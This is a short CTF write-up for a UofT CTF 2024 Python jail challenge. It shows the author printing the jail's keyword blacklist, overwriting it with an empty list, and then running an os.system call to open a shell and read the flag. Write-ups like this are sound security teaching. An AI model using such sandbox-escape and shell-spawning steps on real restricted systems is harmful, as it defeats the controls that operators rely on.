---
layout: writeup
category: UofT-CTF-2024
chall_description:
points: 100
solves: 295
tags: jail pyjail blacklist
date: 2024-1-15
comments: false
---

@windex told me that jails should be sourceless. So no source for you.  

Author: SteakEnthusiast  

`nc 35.226.249.45 5000`  

---

We're given a pyjail without a source file.  

After a bit of exploration, I entered `print(dir())`. This returned the following:  

```py
['__annotations__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', 'blacklist', 'cmd', 'i']
```

So there's a blacklist variable. Can we print it out?  

```py
print(blacklist)
```

This returns:

```py
['import', 'exec', 'eval', 'os', 'open', 'read', 'system', 'module', 'write', '.']
```

Perfect. Now we know what's blacklisted.  

I wasn't sure how to proceed, so I turned to Google. By simply searching `pyjail blacklist`, I found [this](https://ctftime.org/writeup/37232). Its input didn't quite work since it included a `.`, but it gave me an idea. What if I just set blacklist to an empty list?  

```py
blacklist = []
print(blacklist)
```

```py
[]
```

It worked! Now we can just pop a shell and get the flag:  

```py
import os; os.system('sh')
```

```
ls
cat flag
```

    uoftctf{you_got_out_of_jail_free}